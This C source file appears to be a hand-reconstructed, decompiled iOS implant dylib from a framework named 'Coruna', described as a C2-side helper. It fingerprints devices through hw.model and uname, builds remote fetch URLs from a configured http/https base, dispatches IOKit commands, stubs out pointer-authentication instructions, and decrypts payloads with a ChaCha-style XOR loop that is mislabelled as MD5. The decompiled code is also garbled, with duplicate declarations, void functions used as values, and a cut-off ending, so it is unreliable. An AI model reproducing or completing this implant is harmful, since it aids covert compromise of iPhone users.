/*
 * Coruna implant dylib (40c0 variant) — compact C2-side helper
 *
 * Mach-O export _start: builds implant context, dispatches IO commands,
 * resolves dylib sections, and manages rwlock-protected command tables.
 *
 * Rebuild: hand-reconstructed — skipped by rebuild_native_source.py
 * Standard: Framework/coruna/docs/NATIVE_SOURCE_STANDARD.md
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <IOKit/IOKitLib.h>
static inline bool coruna_ldrex_pass(void *addr, size_t size)
{
    (void)addr;
    (void)size;
    return true;
}

static inline bool coruna_ldrexp_clear(void)
{
    return true;
}


typedef void (*coruna_implant_trampoline_fn)(void);

static inline uint64_t coruna_u64_pack(uint32_t hi, uint32_t lo)
{
    return ((uint64_t)hi << 32) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack71(uint64_t hi7, uint8_t lo)
{
    return (hi7 << 8) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack14(uint8_t hi, uint64_t lo)
{
    return ((uint64_t)hi << 32) | (uint32_t)lo;
}

static inline uint64_t coruna_cat(uint64_t hi, uint64_t lo)
{
    return (hi << 32) | (uint32_t)lo;
}



/* Implant runtime constants (from Mach-O image) */
static uint64_t k_implant_branch_mask = 0xaa0803f8f1005f1fULL;
static uint64_t k_implant_remote_arg_a = 0x8b1a16c852800013ULL;
static uint64_t k_implant_remote_arg_b = 0x52800049b900f117ULL;
static uint64_t k_implant_remote_dispatch = 0xf90081153903e109ULL;
static uint64_t k_implant_icache_mode;
static uint64_t k_implant_md5_init_state = 0x77656d6172662e65ULL;
static uint64_t k_implant_dsb_ctrl_a;
static uint64_t k_implant_dsb_ctrl_b;
static void *k_implant_stack_chk_guard_slot = (void *)0x8010000000000002ULL;
static void *k_implant_mach_task_self_slot = (void *)0x8010000000000010ULL;
static void *k_implant_vm_page_mask_slot = (void *)0x8010000000000029ULL;
static void *k_implant_vm_page_size_slot = (void *)0x800000000000002aULL;
void _start(long handle)
{
  int err;
  uint32_t scratch;
  uint64_t bootargs;
  int thread_attr;
  void *host_info;
  long serial_buf;
  long action;
  
  serial_buf = 0;
  action = 0;
  host_info = (void *)0x0;
  thread_attr = 0;
  if (handle != 0) {
    bootargs = 0;
    scratch = 0;
    *(uint8_t *)(handle + 0x5e8) = 0;
    err = coruna_implant_io_dispatch_guarded(handle,0x70000,&host_info,&thread_attr);
    if ((err == 0) && (err = coruna_implant_ctx_build(&action,handle), err == 0)) {
      coruna_implant_dispatch(*(uint64_t *)(action + 0x18),action,0xa0001,&bootargs,&scratch);
    }
    if (action != 0) {
      coruna_implant_ctx_free();
    }
    if (serial_buf != 0) {
      coruna_implant_ctx_free();
    }
    if ((host_info != (void *)0x0) && (thread_attr != 0)) {
      _memset_s(host_info,thread_attr,0,thread_attr);
      _free(host_info);
    }
  }
  return;
}
void coruna_implant_skip_flag_entry(uint64_t val,int flags,uint64_t id_2,uint64_t size_3,
                 uint64_t *off_4)
{
  unsigned long u;
  int *err;
  
  if (off_4 != (uint64_t *)0x0) {
    u = (unsigned long)*(uint *)(off_4 + 1);
    if (*(uint *)(off_4 + 1) != 0) {
      err = (int *)((long)off_4 + 0xc);
      do {
        if (*err == flags) {
          return;
        }
        err = err + 1;
        u = u - 1;
      } while (u != 0);
    }
    coruna_implant_dispatch_wrlocked(*off_4);
  }
  return;
}
void coruna_compression_decode_buffer(uint64_t *val,uint *size)
{
  uint u;
  uint size;
  void *ptr;
  unsigned long version;
  int *err;
  unsigned long port;
  
  if ((((val != (uint64_t *)0x0) &&
       (err = (int *)*val, err != (int *)0x0 && size != (uint *)0x0)) &&
      (u = *size, u != 0)) && ((7 < u && (*err == 0xbedf00d)))) {
    size = err[1];
    port = (unsigned long)size;
    if ((size != 0) && (u - 8 < size)) {
      ptr = _malloc(port + 1);
      if (ptr != (void *)0x0) {
        _memset_s(ptr,port,0,port);
        version = _compression_decode_buffer(ptr,port + 1,err + 2,u - 8,0,0x306);
        if (version == port) {
          _memset_s(err,u,0,u);
          _free(err);
          *val = ptr;
          *size = size;
        }
        else {
          _memset_s(ptr,port,0,port);
          _free(ptr);
        }
      }
    }
  }
  return;
}
void coruna_compression_encode_buffer(uint64_t *val,uint *size)
{
  size_t ls1;
  uint u;
  uint32_t *ptr;
  long handle;
  unsigned long size;
  void *ptr;
  
  if ((val != (uint64_t *)0x0) &&
     (ptr = (void *)*val, ptr != (void *)0x0 && size != (uint *)0x0)) {
    u = *size;
    size = (unsigned long)u;
    if (8 < u + 8) {
      ls1 = size + 8;
      ptr = _malloc(ls1);
      if (ptr != (uint32_t *)0x0) {
        handle = _compression_encode_buffer(ptr + 2,size,ptr,size,0,0x306);
        if (handle - 1U < 0xfffffffe) {
          _memset_s(ptr,size,0,size);
          _free(ptr);
          *ptr = 0xbedf00d;
          ptr[1] = u;
          *val = ptr;
          *size = (int)handle + 8;
        }
        else {
          _memset_s(ptr,ls1,0,ls1);
          _free(ptr);
        }
      }
    }
  }
  return;
}
void coruna_implant40c0_str_hw_model(long handle)
{
  uint u;
  bool err;
  int err;
  int status;
  size_t scratch;
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  long thread_attr;
  
  thread_attr = *(long *)k_implant_stack_chk_guard_slot;
  err = false;
  if (handle == 0) goto fail;
  u = *(uint *)(handle + 0xc0);
  if (u < 0x100700) {
    if (0x100400 < u) {
      err = *(int *)(handle + 0xe0);
      err = true;
      if (err < 0x1b588bb3) {
        if (err != -0x789a1216) {
          status = -0x25cc27c3;
done:
          if (err != status) goto fail;
        }
      }
      else if (err != 0x1b588bb3) {
        status = 0x462504d2;
        goto done;
      }
cleanup:
      err = false;
      goto fail;
    }
    if (0xf8f8 < u - 0xf0707) {
      if (u - 0xf0200 >> 9 < 0x7f) {
        scratch = 0;
        bootargs = 0;
        thread_attr = 0;
        bootargs = 0;
        scratch = 0x20;
        err = _sysctlbyname("hw.model",&bootargs,&scratch,(void *)0x0,0);
        if ((err == 0) && (((byte)bootargs & 0xdf) == 0x4a)) {
          err = *(long *)(handle + 0x640) - 0x40000001U >> 0x1e == 0;
          goto fail;
        }
      }
      goto cleanup;
    }
  }
  err = true;
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(err);
}
void coruna_uname(long handle,long addr_2,uint64_t val,long off_3,long ctx_4,
                 long ctx_5)
{
  uint u;
  uint size;
  uint version;
  uint port;
  uint tag;
  int err;
  uint64_t kind;
  uint type_id;
  uint type_id_8;
  uint type_id_9;
  utsname scratch;
  long scratch;
  
  scratch = *(long *)k_implant_stack_chk_guard_slot;
  kind = 0xad001;
  if (((((handle == 0) || (addr_2 == 0)) || ((int)val == 0)) ||
      ((off_3 == 0 || (ctx_4 == 0)))) || (ctx_5 == 0)) goto fail;
  tag = coruna_implant_probe_hw_model(handle);
  if (tag == 0) {
    type_id = 0;
    goto done;
  }
  version = *(uint *)(handle + 0xdc);
  type_id = *(uint *)(handle + 0xc0);
  if (type_id < 0xf0600) {
    if (type_id < 0xf0000) {
      if (0xe0801 < type_id) goto cleanup;
      if (type_id < 0xd0000) {
        type_id = 0;
        tag = 0;
      }
      else {
        type_id_8 = type_id >> 8 & 0xf00;
        u = type_id >> 4 & 0xf0;
        type_id_9 = 0;
        if (0x4f < u) {
          type_id_9 = 0x50;
        }
        port = 0x70;
        if (u < 0x70) {
          port = type_id_9;
        }
        type_id_9 = 0x70;
        if ((type_id & 0xf) != 0) {
          type_id_9 = u;
        }
        size = 0;
        if (0x7f < u) {
          size = type_id & 0xf;
          port = type_id_9;
        }
        u = 0;
        if (0xdff < type_id_8) {
          u = port;
        }
        type_id = 0;
        if (0xdff < type_id_8) {
          type_id = size;
        }
        type_id_9 = 0x11000000;
        if (version < 2) {
          type_id_9 = 0x10000000;
        }
        type_id = type_id_8 | type_id_9 | u | type_id;
      }
    }
    else {
      _bzero(&scratch,0x500);
      err = _uname(&scratch);
      if ((err != 0) ||
         (scratch.machine != 0x6f685069 || scratch.machine != 0x656e))
      goto cleanup;
      type_id_8 = 0x13000000;
      if (version < 2) {
        type_id_8 = 0x12000000;
      }
      type_id = type_id >> 8 & 0xf00 | type_id_8 | (uint)((type_id & 0xe00) != 0) << 5;
    }
  }
  else {
cleanup:
    type_id = 0xe2000000;
    if (version < 2) {
      type_id = 0x2000000;
    }
  }
done:
  kind = coruna_snprintf(handle,tag | type_id,addr_2,val,off_3,ctx_4,ctx_5);
  if ((int)kind == 0x30001) {
    tag = coruna_implant_probe_hw_model(handle);
    if (tag == 0) {
      type_id = 0;
    }
    else if ((*(byte *)(handle + 0xdb) & 1) == 0) {
      type_id = 0x1000000;
    }
    else {
      type_id = 0xe2000000;
      if (*(uint *)(handle + 0xdc) < 2) {
        type_id = 0x2000000;
      }
    }
    kind = coruna_snprintf(handle,type_id | tag,addr_2,val,off_3,ctx_4,ctx_5);
  }
fail:
  if (*(long *)k_implant_stack_chk_guard_slot != scratch) {
    ___stack_chk_fail(kind);
  }
  return;
}
void coruna_snprintf(long handle,int flags,int *count_2,uint size,char *path,unsigned long arg,
                 long *addr_2)
{
  size_t ls1;
  char err;
  uint u;
  int err;
  size_t ls5;
  char *ptr;
  char *buf;
  unsigned long size;
  uint64_t *ptr;
  char *str;
  char *copy;
  long handle;
  char *data;
  int *err;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t thread_attr;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t host_info;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t serial_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t action;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t block_ctx;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t stack_guard;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_24;
  uint64_t sa_saved;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t cache_27;
  uint64_t sa_new;
  uint64_t cache_28;
  uint64_t cache_29;
  uint64_t cache_30;
  uint64_t path_buf;
  uint64_t cache_31;
  uint64_t cache_32;
  uint64_t cache_33;
  uint64_t tmp_buf;
  uint64_t cache_34;
  uint64_t cache_35;
  uint64_t cache_36;
  uint64_t region;
  uint64_t cache_37;
  uint64_t cache_38;
  uint64_t cache_39;
  uint64_t plist;
  uint64_t cache_40;
  uint64_t cache_41;
  uint64_t cache_42;
  uint64_t url_buf;
  uint64_t cache_43;
  uint64_t cache_44;
  uint64_t cache_45;
  uint64_t json_buf;
  uint64_t cache_46;
  uint64_t cache_47;
  uint64_t cache_48;
  long frame;
  
  frame = *(long *)k_implant_stack_chk_guard_slot;
  if ((((((handle == 0) || (count_2 == (int *)0x0)) || (size < 0x10c)) ||
       ((*count_2 != 0x12345678 || ((char)count_2[2] == '\0')))) ||
      ((*(char *)((long)count_2 + 0x107) != '\0' ||
       ((count_2[0x42] == 0 || (path == (char *)0x0)))))) ||
     ((arg == 0 || (addr_2 == (long *)0x0)))) {
    u = 0xd001;
fail:
    u = u | 0xa0000;
  }
  else {
    u = 0x30001;
    if (flags != 0) {
      size = 0;
      err = count_2 + 0x43;
      do {
        if (((((int *)((long)count_2 + (unsigned long)size) <= err) || (err + 0x19 < count_2)) ||
            ((int *)((long)count_2 + (unsigned long)size) < err + 0x19)) ||
           (*(char *)((long)err + 99) != '\0')) {
          u = 0xd014;
          goto fail;
        }
        if (*err == flags) {
          cache_46 = 0;
          json_buf = 0;
          cache_48 = 0;
          cache_47 = 0;
          cache_43 = 0;
          url_buf = 0;
          cache_45 = 0;
          cache_44 = 0;
          cache_40 = 0;
          plist = 0;
          cache_42 = 0;
          cache_41 = 0;
          cache_37 = 0;
          region = 0;
          cache_39 = 0;
          cache_38 = 0;
          cache_34 = 0;
          tmp_buf = 0;
          cache_36 = 0;
          cache_35 = 0;
          cache_31 = 0;
          path_buf = 0;
          cache_33 = 0;
          cache_32 = 0;
          cache_28 = 0;
          sa_new = 0;
          cache_30 = 0;
          cache_29 = 0;
          cache_25 = 0;
          sa_saved = 0;
          cache_27 = 0;
          cache_26 = 0;
          cache_22 = 0;
          stack_guard = 0;
          cache_24 = 0;
          cache_23 = 0;
          cache = 0;
          block_ctx = 0;
          cache_21 = 0;
          cache_20 = 0;
          json_buf = 0;
          action = 0;
          work = 0;
          frame = 0;
          region = 0;
          serial_buf = 0;
          url_buf = 0;
          plist = 0;
          sa_new = 0;
          host_info = 0;
          tmp_buf = 0;
          path_buf = 0;
          block_ctx = 0;
          thread_attr = 0;
          sa_saved = 0;
          stack_guard = 0;
          host_info = 0;
          bootargs = 0;
          action = 0;
          serial_buf = 0;
          scratch = 0;
          scratch = 0;
          thread_attr = 0;
          bootargs = 0;
          ls5 = _strlen((char *)(count_2 + 2));
          copy = "%s%s";
          if (*(char *)((long)count_2 + ls5 + 7) != '/') {
            copy = "%s/%s";
          }
          err = _snprintf((char *)&scratch,0x200,copy);
          if (0x1ff < err) {
            u = 0xad00c;
            break;
          }
          err = (char)scratch;
          u = 0xad001;
          if ((char)scratch == '\0') break;
          err = (int)scratch;
          if ((err == 0x70747468 && scratch == 0x2f2f3a70) ||
             (scratch == 0x2f2f3a7370747468)) {
            _strlcpy(path,(char *)&scratch,arg);
            goto done;
          }
          copy = *(char **)(handle + 0x80);
          u = 0x30003;
          if ((copy == (char *)0x0) || (*copy == '\0')) break;
          handle = 8;
          err = _strncmp(copy,"https://",8);
          if (err != 0) {
            handle = 7;
            err = _strncmp(copy,"http://",7);
            if (err != 0) {
              u = 0x30004;
              break;
            }
          }
          ptr = _strchr(copy + handle,0x2f);
          if (ptr == (char *)0x0) {
            ls5 = _strlen(copy);
            goto cleanup;
          }
          data = ptr + 1;
          if (err != '/') goto check_ok;
          ptr = &scratch;
          ls5 = (long)(ptr + 1) - (long)copy;
          goto skip;
        }
        size = size + 1;
        err = err + 0x19;
      } while (size < (uint)count_2[0x42]);
    }
  }
next:
  if (*(long *)k_implant_stack_chk_guard_slot != frame) {
    ___stack_chk_fail(u);
  }
  return;
check_ok:
  do {
    str = data;
    buf = _strchr(str,0x2f);
    data = buf + 1;
  } while (buf != (char *)0x0);
  ls5 = (long)str - (long)copy;
cleanup:
  ptr = &scratch;
  if (err == '.') {
    ptr = (uint64_t *)((unsigned long)&scratch | (unsigned long)(scratch == '/') << 1);
  }
skip:
  data = (char *)((long)ptr + -1);
  do {
    data = data + 1;
  } while (*data == '/');
  ls1 = arg;
  if (ls5 + 1 <= arg) {
    ls1 = ls5 + 1;
  }
  _strlcpy(path,copy,ls1);
  if (ptr == (char *)0x0) {
    _strlcat(path,"/",arg);
  }
  _strlcat(path,data,arg);
done:
  u = 0;
  *addr_2 = (long)(err + 1);
  goto next;
}
void coruna_implant_format_dispatch(long handle,long addr_2,uint64_t val,long off_3,long ctx_4,
                 long ctx_5)
{
  int err;
  uint u;
  unsigned long size;
  uint version;
  uint port;
  int status;
  
  if (handle == 0) {
    return;
  }
  if (addr_2 == 0) {
    return;
  }
  if ((int)val == 0) {
    return;
  }
  if (off_3 == 0) {
    return;
  }
  if (ctx_4 == 0) {
    return;
  }
  if (ctx_5 == 0) {
    return;
  }
  if ((*(char *)(handle + 0x5e8) == '\0') || (size = coruna_implant40c0_str_hw_model(handle), (size & 1) != 0)) {
    version = 0;
    goto fail;
  }
  if (*(int *)(handle + 0xc0) - 0x100400U >> 10 < 0x3f) {
    err = *(int *)(handle + 0xe0);
    version = 0x30000;
    if (err < 0x1b588bb3) {
      if (err == -0x789a1216) goto fail;
      status = -0x25cc27c3;
    }
    else {
      if (err == 0x1b588bb3) goto fail;
      status = 0x462504d2;
    }
    if (err == status) goto fail;
  }
  version = 0x50000;
  if (0x400 < *(int *)(handle + 0xc0) - 0x100000U) {
    version = 0;
  }
fail:
  u = coruna_implant_probe_hw_model(handle);
  if (u == 0) {
    port = 0;
  }
  else if ((*(byte *)(handle + 0xdb) & 1) == 0) {
    port = 0xf1000000;
  }
  else {
    port = 0xf3000000;
    if (*(uint *)(handle + 0xdc) < 2) {
      port = 0xf2000000;
    }
  }
  coruna_snprintf(handle,u | version | port,addr_2,val,off_3,ctx_4,ctx_5);
  return;
}
void coruna_implant_io_dispatch_guarded(long handle,int flags,long addr_2,long off_3)
{
  uint32_t scratch;
  uint64_t bootargs[71];
  long thread_attr;
  
  thread_attr = *(long *)k_implant_stack_chk_guard_slot;
  if ((handle != 0) &&
     (((*(long *)(handle + 0x110) != 0 && flags != 0) && addr_2 != 0) && off_3 != 0)) {
    bootargs[0] = 0;
    scratch = 0;
    coruna_implant_dispatch(handle,flags,bootargs,&scratch);
  }
  if (*(long *)k_implant_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail();
}
void coruna_implant_probe_hw_model(long handle)
{
  if (handle != 0) {
    coruna_implant40c0_str_hw_model();
  }
  return;
}
void coruna_implant_path_dispatch(long handle,char *path,uint64_t val,long addr_2,long off_3,
                 long ctx_4)
{
  uint32_t scratch;
  uint64_t bootargs;
  
  if (((handle != 0) && (*(long *)(handle + 0x40) != 0 && path != (char *)0x0)) &&
     (((*path != '\0' && addr_2 != 0) && off_3 != 0) && ctx_4 != 0)) {
    bootargs = 0;
    scratch = 0;
    coruna_implant_dispatch(handle,path,&bootargs,&scratch);
  }
  return;
}
void coruna_implant_nop_invoke(uint64_t val)
{
  coruna_implant_nop(val,0);
  return;
}
void coruna_implant_child_dispatch(long handle,long addr_2)
{
  uint32_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t scratch;
  uint64_t host_info;
  uint64_t bootargs;
  uint64_t serial_buf;
  uint64_t thread_attr;
  uint64_t action;
  uint64_t host_info;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  long sa_saved;
  
  sa_saved = *(long *)k_implant_stack_chk_guard_slot;
  block_ctx = 0;
  action = 0;
  host_info = 0;
  serial_buf = 0;
  thread_attr = 0;
  host_info = 0;
  bootargs = 0;
  thread_attr = 0;
  scratch = 0;
  bootargs = 0;
  scratch = 0;
  if (handle != 0) {
    serial_buf = 0;
    stack_guard = 0;
    block_ctx = 0;
    action = 0;
    coruna_implant_dispatch(*(uint64_t *)(addr_2 + 0x20),addr_2,&bootargs,&scratch);
  }
  if (*(long *)k_implant_stack_chk_guard_slot != sa_saved) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_dladdr(uint64_t val,uint64_t id_2,char *path,unsigned long *arg,
                 uint64_t *size_3,unsigned long *arg)
{
  int err;
  long handle;
  unsigned long u;
  uint8_t *ptr;
  uint64_t scratch;
  mach_header_64 *bootargs;
  uint64_t scratch;
  uint64_t bootargs;
  unsigned long thread_attr;
  
  handle = _dlopen(val,2);
  if (handle != 0) {
    u = _dlsym(handle,id_2);
    if (u != 0) {
      bootargs = (mach_header_64 *)0x0;
      scratch = 0;
      bootargs = 0;
      scratch = 0;
      err = _dladdr(u,&scratch);
      if ((err != 0) &&
         (ptr = _getsectiondata(bootargs,"__TEXT",path,&thread_attr), ptr != (uint8_t *)0x0)
         ) {
        *arg = thread_attr;
        *size_3 = ptr;
        if (arg != (unsigned long *)0x0) {
          *arg = u & 0x7fffffffff;
        }
      }
    }
    _dlclose(handle);
  }
  return;
}
void coruna_implant_measure_string_fields(long handle)
{
  if (*(char **)(handle + 0x80) != (char *)0x0) {
    _strlen(*(char **)(handle + 0x80));
  }
  if (*(char **)(handle + 0x78) != (char *)0x0) {
    _strlen(*(char **)(handle + 0x78));
  }
  if (*(char **)(handle + 0xa0) != (char *)0x0) {
    _strlen(*(char **)(handle + 0xa0));
  }
  if (*(char **)(handle + 0xa8) != (char *)0x0) {
    _strlen(*(char **)(handle + 0xa8));
  }
  return;
}
void coruna_implant_dup_buffer(void *ctx,size_t len,uint64_t *val,size_t *size_2)
{
  void *ptr;
  
  if (((ctx != (void *)0x0) && (len != 0)) &&
     (ptr = _malloc(len), ptr != (void *)0x0)) {
    _memcpy(ptr,ctx,len);
    *val = ptr;
    *size_2 = len;
  }
  return;
}





void coruna_pacia(void)
{
  return;
}





void coruna_pacda(void)
{
  return;
}





void coruna_pacib(void)
{
  return;
}





void coruna_pacdb(void)
{
  return;
}
uint64_t coruna_implant_zero_u64(void)
{
  return 0;
}





void coruna_implant_indirect_call0(coruna_implant_trampoline_fn indirect_target)
{
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4(coruna_implant_trampoline_fn indirect_target, uint32_t size, uint64_t val, long handle)
{
  uint32_t scratch[8];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4_b(coruna_implant_trampoline_fn indirect_target, uint32_t size, uint64_t val, long handle)
{
  uint32_t scratch[12];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4_c(coruna_implant_trampoline_fn indirect_target, uint32_t size, uint64_t val, long handle)
{
  uint32_t scratch[4];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4_d(coruna_implant_trampoline_fn indirect_target, uint32_t size, uint64_t val, long handle)
{
  uint32_t scratch[8];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}
void coruna_implant_md5_xor_loop(uint *size,long handle,long addr_2)
{
  uint u;
  uint size;
  uint version;
  uint port;
  uint tag;
  uint kind;
  uint type_id;
  uint64_t type_id_8;
  unsigned long type_id_9;
  uint type_id_10;
  bool err;
  uint type_id_11;
  unsigned long type_id_12;
  unsigned long type_id_13;
  uint type_id_14;
  long handle;
  byte status;
  int err;
  unsigned long type_id_15;
  uint type_id_16;
  uint type_id_17;
  uint type_id_18;
  uint type_id_19;
  uint type_id_20;
  long addr;
  unsigned long type_id_21;
  uint32_t scratch;
  uint scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t thread_attr;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  int stack_guard [9];
  uint64_t sa_saved;
  uint64_t host_info;
  
  type_id_9 = k_implant_md5_round_const;
  type_id_8 = k_implant_md5_init_state;
  if (((handle != 0) && (addr_2 != 0)) && (size != (uint *)0x0)) {
    handle = 0;
    thread_attr = 0;
    host_info = 0;
    action = 0;
    serial_buf = 0;
    bootargs = 0;
    thread_attr = 0;
    bootargs = 0;
    stack_guard[1] = *size;
    stack_guard[6] = (int)*(uint64_t *)(size + 5);
    stack_guard[7] = (int)((unsigned long)*(uint64_t *)(size + 5) >> 0x20);
    block_ctx = k_implant_md5_init_state;
    type_id_21 = *(unsigned long *)(size + 1);
    stack_guard[4] = (int)*(uint64_t *)(size + 3);
    stack_guard[5] = (int)((unsigned long)*(uint64_t *)(size + 3) >> 0x20);
    stack_guard[2] = (int)type_id_21;
    stack_guard[8] = size[7];
    sa_saved = 0;
    host_info = 0;
    type_id_15 = 0x40;
    do {
      if (type_id_15 < 0x40) {
        status = *(byte *)((long)&scratch + type_id_15);
      }
      else {
        scratch = (uint)type_id_8;
        scratch = (uint)((unsigned long)type_id_8 >> 0x20);
        type_id_15 = sa_saved & 0xffffffff;
        serial_buf = (uint)(sa_saved >> 0x20);
        type_id_10 = serial_buf;
        bootargs = (int)type_id_9;
        type_id_13 = type_id_9 & 0xffffffff;
        bootargs = (uint)(type_id_9 >> 0x20);
        action = 0;
        action = 0;
        err = 10;
        type_id_12 = type_id_21 >> 0x20;
        type_id_20 = stack_guard[1];
        type_id_16 = stack_guard[2];
        type_id_18 = stack_guard[5];
        type_id_19 = stack_guard[6];
        type_id_17 = stack_guard[7];
        type_id_14 = stack_guard[4];
        type_id_11 = stack_guard[8];
        do {
          u = (uint)type_id_15 ^ scratch + type_id_20;
          type_id_18 = (u >> 0x10 | u << 0x10) + type_id_18;
          size = type_id_18 ^ type_id_20;
          scratch = (size >> 0x14 | size << 0xc) + scratch + type_id_20;
          type_id_20 = scratch ^ (u >> 0x10 | u << 0x10);
          type_id_18 = (type_id_20 >> 0x18 | type_id_20 << 8) + type_id_18;
          size = type_id_18 ^ (size >> 0x14 | size << 0xc);
          serial_buf = serial_buf ^ scratch + type_id_16;
          type_id_19 = (serial_buf >> 0x10 | serial_buf << 0x10) + type_id_19;
          u = type_id_19 ^ type_id_16;
          scratch = (u >> 0x14 | u << 0xc) + scratch + type_id_16;
          version = scratch ^ (serial_buf >> 0x10 | serial_buf << 0x10);
          type_id_19 = (version >> 0x18 | version << 8) + type_id_19;
          type_id_16 = type_id_19 ^ (u >> 0x14 | u << 0xc);
          u = (int)type_id_13 + (uint)type_id_12;
          action = (uint)action ^ u;
          type_id_17 = ((uint)action >> 0x10 | (uint)action << 0x10) + type_id_17;
          port = type_id_17 ^ (uint)type_id_12;
          u = (port >> 0x14 | port << 0xc) + u;
          tag = u ^ ((uint)action >> 0x10 | (uint)action << 0x10);
          type_id_17 = (tag >> 0x18 | tag << 8) + type_id_17;
          port = type_id_17 ^ (port >> 0x14 | port << 0xc);
          action = action ^ bootargs + type_id_14;
          type_id_11 = (action >> 0x10 | action << 0x10) + type_id_11;
          kind = type_id_11 ^ type_id_14;
          bootargs = (kind >> 0x14 | kind << 0xc) + bootargs + type_id_14;
          type_id_14 = bootargs ^ (action >> 0x10 | action << 0x10);
          type_id_11 = (type_id_14 >> 0x18 | type_id_14 << 8) + type_id_11;
          kind = type_id_11 ^ (kind >> 0x14 | kind << 0xc);
          scratch = (type_id_16 >> 0x19 | type_id_16 << 7) + scratch;
          type_id_14 = scratch ^ (type_id_14 >> 0x18 | type_id_14 << 8);
          type_id_17 = (type_id_14 >> 0x10 | type_id_14 << 0x10) + type_id_17;
          type_id_16 = type_id_17 ^ (type_id_16 >> 0x19 | type_id_16 << 7);
          scratch = (type_id_16 >> 0x14 | type_id_16 << 0xc) + scratch;
          type_id_14 = scratch ^ (type_id_14 >> 0x10 | type_id_14 << 0x10);
          action = type_id_14 >> 0x18 | type_id_14 << 8;
          type_id_17 = action + type_id_17;
          type_id_16 = type_id_17 ^ (type_id_16 >> 0x14 | type_id_16 << 0xc);
          type_id_16 = type_id_16 >> 0x19 | type_id_16 << 7;
          scratch = (port >> 0x19 | port << 7) + scratch;
          type_id_14 = scratch ^ (type_id_20 >> 0x18 | type_id_20 << 8);
          type_id_11 = (type_id_14 >> 0x10 | type_id_14 << 0x10) + type_id_11;
          type_id_20 = type_id_11 ^ (port >> 0x19 | port << 7);
          scratch = (type_id_20 >> 0x14 | type_id_20 << 0xc) + scratch;
          type_id_14 = scratch ^ (type_id_14 >> 0x10 | type_id_14 << 0x10);
          port = type_id_14 >> 0x18 | type_id_14 << 8;
          type_id_15 = (unsigned long)port;
          type_id_11 = port + type_id_11;
          type_id_14 = type_id_11 ^ (type_id_20 >> 0x14 | type_id_20 << 0xc);
          type_id = type_id_14 >> 0x19 | type_id_14 << 7;
          type_id_12 = (unsigned long)type_id;
          u = (kind >> 0x19 | kind << 7) + u;
          type_id_14 = u ^ (version >> 0x18 | version << 8);
          type_id_18 = (type_id_14 >> 0x10 | type_id_14 << 0x10) + type_id_18;
          type_id_20 = type_id_18 ^ (kind >> 0x19 | kind << 7);
          u = (type_id_20 >> 0x14 | type_id_20 << 0xc) + u;
          type_id_13 = (unsigned long)u;
          type_id_14 = u ^ (type_id_14 >> 0x10 | type_id_14 << 0x10);
          serial_buf = type_id_14 >> 0x18 | type_id_14 << 8;
          type_id_18 = serial_buf + type_id_18;
          type_id_14 = type_id_18 ^ (type_id_20 >> 0x14 | type_id_20 << 0xc);
          type_id_14 = type_id_14 >> 0x19 | type_id_14 << 7;
          bootargs = bootargs + (size >> 0x19 | size << 7);
          type_id_20 = bootargs ^ (tag >> 0x18 | tag << 8);
          type_id_19 = (type_id_20 >> 0x10 | type_id_20 << 0x10) + type_id_19;
          size = type_id_19 ^ (size >> 0x19 | size << 7);
          bootargs = (size >> 0x14 | size << 0xc) + bootargs;
          type_id_20 = bootargs ^ (type_id_20 >> 0x10 | type_id_20 << 0x10);
          action = type_id_20 >> 0x18 | type_id_20 << 8;
          type_id_19 = (uint)action + type_id_19;
          type_id_20 = type_id_19 ^ (size >> 0x14 | size << 0xc);
          type_id_20 = type_id_20 >> 0x19 | type_id_20 << 7;
          err = err + -1;
        } while (err != 0);
        addr = 0;
        bootargs = coruna_u64_pack((type_id_16), (type_id_20));
        serial_buf = coruna_u64_pack((serial_buf), (port));
        host_info = coruna_u64_pack((type_id_19), (type_id_18));
        thread_attr = coruna_u64_pack((type_id_14), (type_id));
        thread_attr = coruna_u64_pack((type_id_11), (type_id_17));
        status = (char)type_id_8 + (char)scratch;
        bootargs = coruna_u64_pack((bootargs), (int)bootargs + u);
        do {
          *(int *)((long)&bootargs + addr + 4) =
               *(int *)((long)stack_guard + addr) + *(int *)((long)&bootargs + addr + 4);
          addr = addr + 4;
        } while (addr != 0x34);
        err = (int)sa_saved == -1;
        sa_saved = coruna_u64_pack((type_id_10), (int)sa_saved + 1);
        type_id_15 = 0;
        if (err) {
          sa_saved = (unsigned long)(type_id_10 + 1) << 0x20;
        }
      }
      *(byte *)(handle + handle) = *(byte *)(handle + handle) ^ status;
      type_id_15 = type_id_15 + 1;
      handle = handle + 1;
    } while (handle != addr_2);
  }
  return;
}
void coruna_mach_make_memory_entry_64(void *ctx,void *scratch,size_t len)
{
  vm_size_t size;
  long handle;
  unsigned long u;
